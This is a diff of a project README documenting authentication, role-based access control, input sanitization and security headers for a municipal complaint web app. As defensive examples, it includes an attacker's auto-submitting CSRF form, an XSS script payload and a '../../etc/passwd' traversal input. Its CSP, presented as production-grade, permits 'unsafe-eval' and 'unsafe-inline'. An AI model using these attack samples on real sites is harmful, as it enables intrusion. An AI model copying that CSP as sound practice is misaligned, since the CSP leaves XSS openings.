-| **CSRF (Cross-Site Request Forgery)** | Attacker tricks user into making authenticated requests | ✅ `sameSite: strict` cookies<br>✅ Origin header validation<br>✅ CSRF tokens (future)<br>✅ Custom headers (Authorization) |
-| **Token Replay Attack** | Stolen token reused by attacker | ✅ Short access token lifespan (15 min)<br>✅ Refresh token rotation<br>✅ HTTPS only (production)<br>✅ Token binding (future) |
-| **Man-in-the-Middle (MITM)** | Attacker intercepts network traffic | ✅ HTTPS enforced (production)<br>✅ HSTS headers<br>✅ Certificate pinning (mobile apps) |
-| **Token Theft from Cookies** | Attacker steals cookies via XSS | ✅ `httpOnly` flag prevents JS access<br>✅ `secure` flag (HTTPS only)<br>✅ `sameSite` flag prevents CSRF |
+| Threat                                | Description                                              | Mitigation Strategy                                                                                                                             |
+| ------------------------------------- | -------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
+| **XSS (Cross-Site Scripting)**        | Malicious scripts steal tokens from localStorage/cookies | ✅ Refresh token in `httpOnly` cookie<br>✅ Access token in memory (lost on XSS)<br>✅ Content Security Policy headers<br>✅ Input sanitization |
+| **CSRF (Cross-Site Request Forgery)** | Attacker tricks user into making authenticated requests  | ✅ `sameSite: strict` cookies<br>✅ Origin header validation<br>✅ CSRF tokens (future)<br>✅ Custom headers (Authorization)                    |
+| **Token Replay Attack**               | Stolen token reused by attacker                          | ✅ Short access token lifespan (15 min)<br>✅ Refresh token rotation<br>✅ HTTPS only (production)<br>✅ Token binding (future)                 |
+| **Man-in-the-Middle (MITM)**          | Attacker intercepts network traffic                      | ✅ HTTPS enforced (production)<br>✅ HSTS headers<br>✅ Certificate pinning (mobile apps)                                                       |
+| **Token Theft from Cookies**          | Attacker steals cookies via XSS                          | ✅ `httpOnly` flag prevents JS access<br>✅ `secure` flag (HTTPS only)<br>✅ `sameSite` flag prevents CSRF                                      |
 
 #### XSS Protection
 
@@ -8692,7 +9763,7 @@ console.log(document.cookie); // Output: "" (empty, httpOnly cookies not visible
 ```html
 <!-- Attacker's malicious site -->
 <form action="https://ttaurban.com/api/auth/logout" method="POST">
-  <input type="hidden" name="action" value="logout">
+  <input type="hidden" name="action" value="logout" />
 </form>
 <script>
   // Auto-submit form when user visits page
@@ -8736,12 +9807,14 @@ if (["POST", "PUT", "DELETE", "PATCH"].includes(req.method)) {
 **Solutions:**
 
 1. **Short Access Token Lifespan** (15 minutes)
+
    ```typescript
    // Token expires quickly, limiting damage window
-   expiresIn: "15m"
+   expiresIn: "15m";
    ```
 
 2. **Refresh Token Rotation**
+
    ```typescript
    // Every refresh generates NEW refresh token, invalidating old one
    const { refreshToken: newRefreshToken } = generateTokenPair(user);
@@ -8749,11 +9822,12 @@ if (["POST", "PUT", "DELETE", "PATCH"].includes(req.method)) {
    ```
 
 3. **Token Binding** (Future Enhancement)
+
    ```typescript
    // Bind token to device/IP/fingerprint
    const deviceId = getDeviceFingerprint(req);
    const token = jwt.sign({ ...user, deviceId }, secret);
-   
+
    // Verify device on each request
    if (decoded.deviceId !== currentDeviceId) {
      throw new Error("Token used from different device!");
@@ -8801,6 +9875,7 @@ if (process.env.NODE_ENV === "production") {
 ### Implementation Files
 
 **Server-Side:**
+
 - [app/lib/jwt.ts](./ttaurban/app/lib/jwt.ts) - JWT generation, verification, token utilities
 - [app/lib/authMiddleware.ts](./ttaurban/app/lib/authMiddleware.ts) - Route protection middleware (`withAuth`, `withRole`)
 - [app/api/auth/login/route.ts](./ttaurban/app/api/auth/login/route.ts) - Login endpoint with token generation
@@ -8811,10 +9886,12 @@ if (process.env.NODE_ENV === "production") {
 - [middleware.ts](./ttaurban/middleware.ts) - Security headers, CSRF protection, auth checks
 
 **Client-Side:**
+
 - [context/AuthContext.tsx](./ttaurban/context/AuthContext.tsx) - Auth state management, login/logout/refresh logic
 - [lib/fetchWithAuth.ts](./ttaurban/lib/fetchWithAuth.ts) - Fetch wrapper with automatic token refresh
 
 **Testing:**
+
 - [test-auth-flow.js](./ttaurban/test-auth-flow.js) - Automated test script for authentication flow
 
 ### Testing Evidence
@@ -8945,6 +10022,7 @@ curl -X POST http://localhost:3000/api/auth/logout \
 #### Browser DevTools Testing
 
 **1. Check Cookies:**
+
 - Open DevTools (F12)
 - Go to Application tab → Cookies
 - Verify `refreshToken` has:
@@ -8953,6 +10031,7 @@ curl -X POST http://localhost:3000/api/auth/logout \
   - ✅ SameSite: Strict
 
 **2. Check Network Requests:**
+
 - Go to Network tab
 - Login/signup
 - Verify response headers include:
@@ -8961,6 +10040,7 @@ curl -X POST http://localhost:3000/api/auth/logout \
   ```
 
 **3. Test Auto-Refresh:**
+
 - Login to app
 - Open Console
 - Wait 16 minutes (access token expires after 15 min)
@@ -9020,6 +10100,7 @@ node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
 ### Reflection: Why This Implementation Matters
 
 **Problem:** Simple JWT implementations often have critical security flaws:
+
 - Tokens stored in localStorage (XSS vulnerable)
 - Long-lived tokens (replay attack risk)
 - No token rotation (compromise persists)
@@ -9039,6 +10120,7 @@ node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
 ✅ **Compliance Ready:** Follows OWASP recommendations and industry best practices
 
 **The difference between amateur and professional authentication:**
+
 - Amateur: Single long-lived token in localStorage → One XSS = Full account compromise
 - Professional: Dual token system with rotation + HTTP-only storage → Multiple layers of protection, limited blast radius
 
@@ -9105,42 +10187,47 @@ TTA-Urban implements a hierarchical role system where higher roles inherit capab
 
 ### Roles & Permissions Matrix
 
-| Role | Permissions | Use Case |
-|------|------------|----------|
-| **ADMIN** | • All CRUD operations on all resources<br>• User & role management (`MANAGE_ROLES`)<br>• View audit logs (`VIEW_AUDIT_LOGS`)<br>• System configuration (`MANAGE_SETTINGS`)<br>• Department management<br>• File management | System administrators who need complete control over the platform |
-| **EDITOR** | • Create/Read/Update users<br>• Create/Read/Update complaints<br>• Read/Update departments<br>• Create/Read/Update files<br>• ✗ Cannot delete users<br>• ✗ Cannot manage roles<br>• ✗ Cannot view audit logs | Municipal officers who process complaints and manage content but shouldn't have admin privileges |
-| **USER** | • Read/Update own profile<br>• Create complaints<br>• Read own complaints<br>• Read departments<br>• Create/Read own files<br>• ✗ Cannot access other users' data<br>• ✗ Cannot delete anything | Citizens who submit complaints and track their status |
-| **VIEWER** | • Read users<br>• Read complaints<br>• Read departments<br>• Read files<br>• ✗ No create/update/delete permissions | Observers, auditors, or stakeholders who need visibility without modification rights |
+| Role       | Permissions                                                                                                                                                                                                                | Use Case                                                                                         |
+| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| **ADMIN**  | • All CRUD operations on all resources<br>• User & role management (`MANAGE_ROLES`)<br>• View audit logs (`VIEW_AUDIT_LOGS`)<br>• System configuration (`MANAGE_SETTINGS`)<br>• Department management<br>• File management | System administrators who need complete control over the platform                                |
+| **EDITOR** | • Create/Read/Update users<br>• Create/Read/Update complaints<br>• Read/Update departments<br>• Create/Read/Update files<br>• ✗ Cannot delete users<br>• ✗ Cannot manage roles<br>• ✗ Cannot view audit logs               | Municipal officers who process complaints and manage content but shouldn't have admin privileges |
+| **USER**   | • Read/Update own profile<br>• Create complaints<br>• Read own complaints<br>• Read departments<br>• Create/Read own files<br>• ✗ Cannot access other users' data<br>• ✗ Cannot delete anything                            | Citizens who submit complaints and track their status                                            |
+| **VIEWER** | • Read users<br>• Read complaints<br>• Read departments<br>• Read files<br>• ✗ No create/update/delete permissions                                                                                                         | Observers, auditors, or stakeholders who need visibility without modification rights             |
 
 ### Permission Categories
 
 Permissions are organized by resource type:
 
 #### User Management
+
 - `CREATE_USER` - Create new user accounts
 - `READ_USER` - View user information
 - `UPDATE_USER` - Modify user details
 - `DELETE_USER` - Remove user accounts
 
 #### Complaint Management
+
 - `CREATE_COMPLAINT` - Submit new complaints
 - `READ_COMPLAINT` - View complaint details
 - `UPDATE_COMPLAINT` - Modify complaint status/details
 - `DELETE_COMPLAINT` - Remove complaints
 
 #### Department Management
+
 - `CREATE_DEPARTMENT` - Create new departments
 - `READ_DEPARTMENT` - View department information
 - `UPDATE_DEPARTMENT` - Modify department details
 - `DELETE_DEPARTMENT` - Remove departments
 
 #### File Management
+
 - `CREATE_FILE` - Upload files/attachments
 - `READ_FILE` - Download/view files
 - `UPDATE_FILE` - Modify file metadata
 - `DELETE_FILE` - Remove files
 
 #### Administrative Operations
+
 - `MANAGE_ROLES` - Assign and modify user roles
 - `VIEW_AUDIT_LOGS` - Access security audit logs
 - `MANAGE_SETTINGS` - Configure system settings
@@ -9155,17 +10242,17 @@ Centralized role and permission definitions:
 
 ```typescript
 export enum Role {
-  ADMIN = 'admin',
-  EDITOR = 'editor',
-  VIEWER = 'viewer',
-  USER = 'user',
+  ADMIN = "admin",
+  EDITOR = "editor",
+  VIEWER = "viewer",
+  USER = "user",
 }
 
 export enum Permission {
-  CREATE_USER = 'create:user',
-  READ_USER = 'read:user',
-  UPDATE_USER = 'update:user',
-  DELETE_USER = 'delete:user',
+  CREATE_USER = "create:user",
+  READ_USER = "read:user",
+  UPDATE_USER = "update:user",
+  DELETE_USER = "delete:user",
   // ... more permissions
 }
 
@@ -9214,7 +10301,7 @@ export function canAccessResource(
   if (user.id === resourceOwnerId) {
     return true;
   }
-  
+
   // Otherwise, check if user has the required permission
   return hasPermission(user.role, requiredPermission);
 }
@@ -9224,20 +10311,31 @@ export function canAccessResource(
  */
 export class ResourceAuthorizer {
   constructor(private user: RBACUser) {}
-  
-  canRead(resourceOwnerId: string, resourceType: 'user' | 'complaint' | 'department' | 'file'): boolean {
+
+  canRead(
+    resourceOwnerId: string,
+    resourceType: "user" | "complaint" | "department" | "file"
+  ): boolean {
     const permissionMap = {
       user: Permission.READ_USER,
       complaint: Permission.READ_COMPLAINT,
       department: Permission.READ_DEPARTMENT,
       file: Permission.READ_FILE,
     };
-    
-    return canAccessResource(this.user, resourceOwnerId, permissionMap[resourceType]);
+
+    return canAccessResource(
+      this.user,
+      resourceOwnerId,
+      permissionMap[resourceType]
+    );
   }
-  
-  canUpdate(resourceOwnerId: string, resourceType: string): boolean { /* ... */ }
-  canDelete(resourceOwnerId: string, resourceType: string): boolean { /* ... */ }
+
+  canUpdate(resourceOwnerId: string, resourceType: string): boolean {
+    /* ... */
+  }
+  canDelete(resourceOwnerId: string, resourceType: string): boolean {
+    /* ... */
+  }
 }
 ```
 
@@ -9258,7 +10356,7 @@ export function withPermission(
   return withAuth(async (req: NextRequest, user: JWTPayload) => {
     const userRole = user.role as Role;
     const allowed = hasPermission(userRole, permission);
-    
+
     // Log the permission check
     auditLogger.logPermissionCheck(
       String(user.id),
@@ -9266,15 +10364,15 @@ export function withPermission(
       userRole,
       permission,
       allowed ? AuditResult.ALLOWED : AuditResult.DENIED,
-      allowed 
-        ? `Role '${userRole}' has permission '${permission}'` 
+      allowed
+        ? `Role '${userRole}' has permission '${permission}'`
         : `Role '${userRole}' lacks permission '${permission}'`,
-      { 
+      {
         endpoint: req.nextUrl.pathname,
         method: req.method,
       }
     );
-    
+
     if (!allowed) {
       return NextResponse.json(
         {
@@ -9294,24 +10392,23 @@ export function withPermission(
 /**
  * Role-based access control middleware
  */
-export function withRole(
-  allowedRoles: Role[],
-  handler: AuthenticatedHandler
-) {
+export function withRole(allowedRoles: Role[], handler: AuthenticatedHandler) {
   return withAuth(async (req: NextRequest, user: JWTPayload) => {
     const userRole = user.role as Role;
-    const hasRole = allowedRoles.some(role => 
+    const hasRole = allowedRoles.some((role) =>
       meetsRoleRequirement(userRole, role)
     );
-    
+
     // Log the role check
     auditLogger.logRoleCheck(/* ... */);
-    
+
     if (!hasRole) {
       return NextResponse.json(
         {
           success: false,
-          message: `Insufficient permissions. Required role: ${allowedRoles.join(' or ')}`,
+          message: `Insufficient permissions. Required role: ${allowedRoles.join(
+            " or "
+          )}`,
           error: "FORBIDDEN",
         },
         { status: 403 }
@@ -9328,8 +10425,8 @@ export function withRole(
 **Example:** [app/api/users/route.ts](./ttaurban/app/api/users/route.ts)
 
 ```typescript
-import { withPermission } from '@/app/lib/authMiddleware';
-import { Permission } from '@/app/config/roles';
+import { withPermission } from "@/app/lib/authMiddleware";
+import { Permission } from "@/app/config/roles";
 
 /**
  * GET /api/users
@@ -9345,18 +10442,21 @@ export const GET = withPermission(Permission.READ_USER, async (req, user) => {
  * POST /api/users
  * @requires Permission: CREATE_USER
  */
-export const POST = withPermission(Permission.CREATE_USER, async (req, user) => {
-  // Only users with CREATE_USER permission can create users
-  const newUser = await prisma.user.create({ data: await req.json() });
-  return NextResponse.json({ success: true, data: newUser }, { status: 201 });
-});
+export const POST = withPermission(
+  Permission.CREATE_USER,
+  async (req, user) => {
+    // Only users with CREATE_USER permission can create users
+    const newUser = await prisma.user.create({ data: await req.json() });
+    return NextResponse.json({ success: true, data: newUser }, { status: 201 });
+  }
+);
 ```
 
 **Example:** [app/api/admin/stats/route.ts](./ttaurban/app/api/admin/stats/route.ts)
 
 ```typescript
-import { withRole } from '@/app/lib/authMiddleware';
-import { Role } from '@/app/config/roles';
+import { withRole } from "@/app/lib/authMiddleware";
+import { Role } from "@/app/config/roles";
 
 /**
  * GET /api/admin/stats
@@ -9376,8 +10476,8 @@ export const GET = withRole([Role.ADMIN], async (req, user) => {
 React components for role-based UI rendering:
 
 ```tsx
-import { RoleGuard, AdminOnly, usePermission } from '@/components/RoleGuard';
-import { Role, Permission } from '@/app/config/roles';
+import { RoleGuard, AdminOnly, usePermission } from "@/components/RoleGuard";
+import { Role, Permission } from "@/app/config/roles";
 
 export default function Dashboard() {
   const { hasPermission, hasRole } = usePermission();
@@ -9390,7 +10490,7 @@ export default function Dashboard() {
       </AdminOnly>
 
       {/* Permission-based rendering */}
-      <RoleGuard 
+      <RoleGuard
         permissions={[Permission.CREATE_USER]}
         fallback={<p>You cannot create users</p>}
       >
@@ -9403,9 +10503,7 @@ export default function Dashboard() {
       )}
 
       {/* Role-based rendering */}
-      {hasRole(Role.ADMIN) && (
-        <Link href="/admin">Admin Panel</Link>
-      )}
+      {hasRole(Role.ADMIN) && <Link href="/admin">Admin Panel</Link>}
     </div>
   );
 }
@@ -9440,15 +10538,15 @@ Every authorization decision is logged for security auditing:
 
 ```typescript
 export enum AuditAction {
-  PERMISSION_CHECK = 'PERMISSION_CHECK',
-  ROLE_CHECK = 'ROLE_CHECK',
-  RESOURCE_ACCESS = 'RESOURCE_ACCESS',
-  API_ACCESS = 'API_ACCESS',
+  PERMISSION_CHECK = "PERMISSION_CHECK",
+  ROLE_CHECK = "ROLE_CHECK",
+  RESOURCE_ACCESS = "RESOURCE_ACCESS",
+  API_ACCESS = "API_ACCESS",
 }
 
 export enum AuditResult {
-  ALLOWED = 'ALLOWED',
-  DENIED = 'DENIED',
+  ALLOWED = "ALLOWED",
+  DENIED = "DENIED",
 }
 
 // Automatic logging on every permission check
@@ -9458,7 +10556,7 @@ auditLogger.logPermissionCheck(
   userRole,
   permission,
   AuditResult.ALLOWED,
-  'Role admin has permission create:user'
+  "Role admin has permission create:user"
 );
 ```
 
@@ -9696,7 +10794,7 @@ model User {
   role              UserRole    @default(USER)  // Default role for new users
   createdAt         DateTime    @default(now())
   updatedAt         DateTime    @updatedAt
-  
+
   // Relations...
 }
 ```
@@ -9733,8 +10831,8 @@ Decision: ALLOW ✓
 Response: 200 OK - User deleted
 
 Audit Log:
-[RBAC AUDIT] 2025-12-27T10:45:12.345Z | User: admin@test.com (admin) | 
-Action: PERMISSION_CHECK | Resource: delete:user | Result: ALLOWED | 
+[RBAC AUDIT] 2025-12-27T10:45:12.345Z | User: admin@test.com (admin) |
+Action: PERMISSION_CHECK | Resource: delete:user | Result: ALLOWED |
 Reason: Role 'admin' has permission 'delete:user'
 ```
 
@@ -9756,8 +10854,8 @@ Decision: DENY ✗
 Response: 403 Forbidden
 
 Audit Log:
-[RBAC AUDIT] 2025-12-27T10:46:23.456Z | User: editor@test.com (editor) | 
-Action: PERMISSION_CHECK | Resource: delete:user | Result: DENIED | 
+[RBAC AUDIT] 2025-12-27T10:46:23.456Z | User: editor@test.com (editor) |
+Action: PERMISSION_CHECK | Resource: delete:user | Result: DENIED |
 Reason: Role 'editor' lacks permission 'delete:user'
 ```
 
@@ -9779,8 +10877,8 @@ Decision: ALLOW ✓ (ownership bypass)
 Response: 200 OK - Complaint data
 
 Audit Log:
-[RBAC AUDIT] 2025-12-27T10:47:34.567Z | User: user@test.com (user) | 
-Action: RESOURCE_ACCESS | Resource: complaint:456 | Result: ALLOWED | 
+[RBAC AUDIT] 2025-12-27T10:47:34.567Z | User: user@test.com (user) |
+Action: RESOURCE_ACCESS | Resource: complaint:456 | Result: ALLOWED |
 Reason: User is owner of resource
 ```
 
@@ -9802,8 +10900,8 @@ Decision: DENY ✗
 Response: 403 Forbidden
 
 Audit Log:
-[RBAC AUDIT] 2025-12-27T10:48:45.678Z | User: viewer@test.com (viewer) | 
-Action: PERMISSION_CHECK | Resource: update:complaint | Result: DENIED | 
+[RBAC AUDIT] 2025-12-27T10:48:45.678Z | User: viewer@test.com (viewer) |
+Action: PERMISSION_CHECK | Resource: update:complaint | Result: DENIED |
 Reason: Role 'viewer' lacks permission 'update:complaint'
 ```
 
@@ -9827,7 +10925,7 @@ Future: Store roles/permissions in database
 ```typescript
 // Dynamic permission loading
 const roles = await prisma.role.findMany({
-  include: { permissions: true }
+  include: { permissions: true },
 });
 
 // Allows runtime permission changes without code deployment
@@ -9841,13 +10939,15 @@ Future: Context-aware policies
 ```typescript
 // Policy example
 const policy = {
-  resource: 'complaint',
-  action: 'update',
+  resource: "complaint",
+  action: "update",
   condition: (user, resource) => {
-    return user.id === resource.userId || 
-           user.department === resource.department ||
-           user.role === Role.ADMIN;
-  }
+    return (
+      user.id === resource.userId ||
+      user.department === resource.department ||
+      user.role === Role.ADMIN
+    );
+  },
 };
 
 // More flexible than pure RBAC
@@ -9876,9 +10976,9 @@ Future: Field-level permissions
 
 ```typescript
 const fieldPermissions = {
-  'user.role': [Role.ADMIN],
-  'user.email': [Role.ADMIN, Role.EDITOR],
-  'user.name': [Role.ADMIN, Role.EDITOR, Role.USER],
+  "user.role": [Role.ADMIN],
+  "user.email": [Role.ADMIN, Role.EDITOR],
+  "user.name": [Role.ADMIN, Role.EDITOR, Role.USER],
 };
 
 // Different roles can update different fields
@@ -9888,9 +10988,8 @@ const fieldPermissions = {
 
 ```typescript
 const hasTemporaryAccess = (user, resource, currentTime) => {
-  return user.temporaryPermissions.some(perm => 
-    perm.resource === resource &&
-    perm.expiresAt > currentTime
+  return user.temporaryPermissions.some(
+    (perm) => perm.resource === resource && perm.expiresAt > currentTime
   );
 };
 
@@ -9914,6 +11013,7 @@ interface TenantRBAC {
 #### Why RBAC Matters
 
 **Problem:** Without RBAC, applications face:
+
 - Security risks (any user can perform any action)
 - Data breaches (unauthorized access to sensitive information)
 - Compliance violations (cannot prove access control)
@@ -9937,19 +11037,20 @@ interface TenantRBAC {
 
 #### Comparison with Alternative Approaches
 
-| Approach | Pros | Cons | When to Use |
-|----------|------|------|-------------|
-| **No Access Control** | • Simple to implement<br>• Fast development | • ❌ Major security risk<br>• ❌ No compliance<br>• ❌ Data breaches | Never in production |
-| **Client-Side Only** | • Good UX<br>• Fast UI rendering | • ❌ Not secure (bypassable)<br>• ❌ False sense of security | Only as UX enhancement, not security |
-| **Simple Admin Flag** | • Easy to understand<br>• Quick to implement | • ❌ Not granular<br>• ❌ All-or-nothing access<br>• ❌ Hard to extend | Small apps with 2 roles |
-| **RBAC (Our Implementation)** | • ✅ Granular control<br>• ✅ Scalable<br>• ✅ Auditable<br>• ✅ Type-safe | • More complex setup<br>• Requires planning | Production apps (TTA-Urban) |
-| **ABAC (Future)** | • ✅ Most flexible<br>• ✅ Context-aware<br>• ✅ Dynamic policies | • Complex to implement<br>• Harder to debug | Enterprise systems |
+| Approach                      | Pros                                                                       | Cons                                                                   | When to Use                          |
+| ----------------------------- | -------------------------------------------------------------------------- | ---------------------------------------------------------------------- | ------------------------------------ |
+| **No Access Control**         | • Simple to implement<br>• Fast development                                | • ❌ Major security risk<br>• ❌ No compliance<br>• ❌ Data breaches   | Never in production                  |
+| **Client-Side Only**          | • Good UX<br>• Fast UI rendering                                           | • ❌ Not secure (bypassable)<br>• ❌ False sense of security           | Only as UX enhancement, not security |
+| **Simple Admin Flag**         | • Easy to understand<br>• Quick to implement                               | • ❌ Not granular<br>• ❌ All-or-nothing access<br>• ❌ Hard to extend | Small apps with 2 roles              |
+| **RBAC (Our Implementation)** | • ✅ Granular control<br>• ✅ Scalable<br>• ✅ Auditable<br>• ✅ Type-safe | • More complex setup<br>• Requires planning                            | Production apps (TTA-Urban)          |
+| **ABAC (Future)**             | • ✅ Most flexible<br>• ✅ Context-aware<br>• ✅ Dynamic policies          | • Complex to implement<br>• Harder to debug                            | Enterprise systems                   |
 
 #### Real-World Impact
 
 **Scenario:** Municipal officer attempts to delete all complaints
 
 **Without RBAC:**
+
 ```typescript
 // Any authenticated user can delete
 export async function DELETE(req, { params }) {
@@ -9961,11 +11062,15 @@ export async function DELETE(req, { params }) {
 ```
 
 **With RBAC:**
+
 ```typescript
-export const DELETE = withPermission(Permission.DELETE_COMPLAINT, async (req, user) => {
-  await prisma.complaint.delete({ where: { id: params.id } });
-  return NextResponse.json({ success: true });
-});
+export const DELETE = withPermission(
+  Permission.DELETE_COMPLAINT,
+  async (req, user) => {
+    await prisma.complaint.delete({ where: { id: params.id } });
+    return NextResponse.json({ success: true });
+  }
+);
 
 // Result: Only authorized admins can delete
 // All attempts logged for audit
@@ -10005,14 +11110,14 @@ Comprehensive input sanitization system protecting against XSS, SQL Injection, P
 
 ### Implementation Files
 
-| File | Purpose | Lines |
-|------|---------|-------|
-| `app/lib/sanitize.ts` | Core server-side sanitization engine | 450+ |
-| `app/lib/sanitize.client.ts` | Client-side sanitization utilities | 100+ |
-| `app/lib/sanitizationMiddleware.ts` | API route middleware for auto-sanitization | 150+ |
-| `components/ui/SafeContent.tsx` | React component for safe HTML rendering | 200+ |
-| `app/security-demo/page.tsx` | Interactive demo & testing page | 300+ |
-| `test-owasp.js` | Automated test suite (25+ tests) | 275 |
+| File                                | Purpose                                    | Lines |
+| ----------------------------------- | ------------------------------------------ | ----- |
+| `app/lib/sanitize.ts`               | Core server-side sanitization engine       | 450+  |
+| `app/lib/sanitize.client.ts`        | Client-side sanitization utilities         | 100+  |
+| `app/lib/sanitizationMiddleware.ts` | API route middleware for auto-sanitization | 150+  |
+| `components/ui/SafeContent.tsx`     | React component for safe HTML rendering    | 200+  |
+| `app/security-demo/page.tsx`        | Interactive demo & testing page            | 300+  |
+| `test-owasp.js`                     | Automated test suite (25+ tests)           | 275   |
 
 ### Key Features
 
@@ -10020,9 +11125,9 @@ Comprehensive input sanitization system protecting against XSS, SQL Injection, P
 
 ```typescript
 enum SanitizationLevel {
-  STRICT = "strict",    // Maximum security, minimal formatting
+  STRICT = "strict", // Maximum security, minimal formatting
   BALANCED = "balanced", // Security + basic formatting
-  PERMISSIVE = "permissive" // More formatting, still safe
+  PERMISSIVE = "permissive", // More formatting, still safe
 }
 ```
 
@@ -10035,8 +11140,9 @@ enum SanitizationLevel {
 - CSS expression filtering
 
 **Example:**
+
 ```typescript
-sanitizeInput("<script>alert('xss')</script>", SanitizationLevel.STRICT)
+sanitizeInput("<script>alert('xss')</script>", SanitizationLevel.STRICT);
 // Output: "&lt;script&gt;alert('xss')&lt;/script&gt;"
 ```
 
@@ -10050,7 +11156,7 @@ sanitizeInput("<script>alert('xss')</script>", SanitizationLevel.STRICT)
 #### 4. Path Traversal Defense
 
 ```typescript
-sanitizeFilePath("../../etc/passwd")
+sanitizeFilePath("../../etc/passwd");
 // Output: "etc/passwd" (directory traversal removed)
 ```
 
@@ -10059,18 +11165,20 @@ sanitizeFilePath("../../etc/passwd")
 All malicious attempts are logged with color-coded console output:
 
 - 🔴 **XSS_ATTEMPT** - Script injection detected
-- 🟡 **SQL_INJECTION** - SQL pattern detected  
+- 🟡 **SQL_INJECTION** - SQL pattern detected
 - 🟠 **PATH_TRAVERSAL** - Directory traversal blocked
 - 🔵 **INVALID_INPUT** - Input validation failed
 
 ### Testing
 
 Run comprehensive test suite:
+
 ```bash
 node test-owasp.js
 ```
 
 **Test Coverage:**
+
 - ✅ XSS attacks (8 tests)
 - ✅ SQL injection (6 tests)
 - ✅ Path traversal (4 tests)
@@ -10095,11 +11203,7 @@ export const POST = sanitizationMiddleware(async (req: Request) => {
 ```typescript
 import { SafeContent } from "@/components/ui/SafeContent";
 
-<SafeContent 
-  content={userInput} 
-  level="balanced" 
-  showWarnings={true}
-/>
+<SafeContent content={userInput} level="balanced" showWarnings={true} />;
 ```
 
 ### Security Score Impact
@@ -10117,14 +11221,14 @@ Production-grade security headers implementation with HSTS, CSP, CORS, and 5 add
 
 ### Implementation Files
 
-| File | Purpose | Lines |
-|------|---------|-------|
-| `next.config.mjs` | Primary security headers configuration | +60 |
-| `middleware.ts` | Enhanced with CORS & security headers | v3 |
-| `app/lib/corsConfig.ts` | CORS utilities & whitelist management | 110 |
-| `app/lib/securityHeaders.ts` | Security headers utilities & docs | 170 |
-| `app/security-headers/page.tsx` | Interactive testing page | 370 |
-| `test-security-headers.js` | Automated test suite | 280 |
+| File                            | Purpose                                | Lines |
+| ------------------------------- | -------------------------------------- | ----- |
+| `next.config.mjs`               | Primary security headers configuration | +60   |
+| `middleware.ts`                 | Enhanced with CORS & security headers  | v3    |
+| `app/lib/corsConfig.ts`         | CORS utilities & whitelist management  | 110   |
+| `app/lib/securityHeaders.ts`    | Security headers utilities & docs      | 170   |
+| `app/security-headers/page.tsx` | Interactive testing page               | 370   |
+| `test-security-headers.js`      | Automated test suite                   | 280   |
 
 ### Security Headers Implemented
 
@@ -10139,7 +11243,7 @@ Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 #### 2. Content Security Policy (CSP)
 
 ```
-Content-Security-Policy: 
+Content-Security-Policy:
   default-src 'self';
   script-src 'self' 'unsafe-eval' 'unsafe-inline';
   style-src 'self' 'unsafe-inline';
@@ -10158,8 +11262,8 @@ Content-Security-Policy:
 ```typescript
 const ALLOWED_ORIGINS = [
   "http://localhost:3000",
-  "http://localhost:3001", 
-  "https://ttaurban.vercel.app"
+  "http://localhost:3001",
+  "https://ttaurban.vercel.app",
 ];
 ```
 
@@ -10167,13 +11271,13 @@ const ALLOWED_ORIGINS = [
 
 #### 4. Additional Headers
 
-| Header | Value | Protection |
-|--------|-------|------------|
-| X-Frame-Options | DENY | Prevents clickjacking |
-| X-Content-Type-Options | nosniff | Blocks MIME-type sniffing |
-| X-XSS-Protection | 1; mode=block | Legacy XSS protection |
-| Referrer-Policy | strict-origin-when-cross-origin | Limits referrer leaks |
-| Permissions-Policy | camera=(), microphone=(), geolocation=() | Blocks unwanted APIs |
+| Header                 | Value                                    | Protection                |
+| ---------------------- | ---------------------------------------- | ------------------------- |
+| X-Frame-Options        | DENY                                     | Prevents clickjacking     |
+| X-Content-Type-Options | nosniff                                  | Blocks MIME-type sniffing |
+| X-XSS-Protection       | 1; mode=block                            | Legacy XSS protection     |
+| Referrer-Policy        | strict-origin-when-cross-origin          | Limits referrer leaks     |
+| Permissions-Policy     | camera=(), microphone=(), geolocation=() | Blocks unwanted APIs      |
 
 ### CORS Configuration
 
@@ -10186,6 +11290,7 @@ export const GET = withCors(async (req: Request) => {
 ```
 
 **Features:**
+
 - ✅ Whitelist-based origins (never uses `*`)
 - ✅ Credentials support enabled
 - ✅ OPTIONS preflight handling
@@ -10199,6 +11304,7 @@ export const GET = withCors(async (req: Request) => {
 **Flow:** Request → CORS Check → OPTIONS Handling → Security Headers → CSRF → JWT Auth → Route
 
 **Key Features:**
+
 - CORS headers for cross-origin requests
 - Enhanced HSTS (2 years)
 - CSP with SendGrid support
@@ -10208,16 +11314,19 @@ export const GET = withCors(async (req: Request) => {
 ### Testing
 
 #### Local Testing
+
 ```bash
 node test-security-headers.js
 ```
 
 #### Interactive Demo
+
 ```
 http://localhost:3000/security-headers
 ```
 
 **Features:**
+
 - Live header inspection
 - Test buttons for HSTS, CSP, CORS
 - Real-time results display
@@ -10226,7 +11335,7 @@ http://localhost:3000/security-headers
 #### Production Testing
 
 1. **SecurityHeaders.com** - Scan for A+ grade
-2. **Mozilla Observatory** - Comprehensive security audit  
+2. **Mozilla Observatory** - Comprehensive security audit
 3. **SSL Labs** - SSL/TLS configuration check
 
 ### Security Score Impact
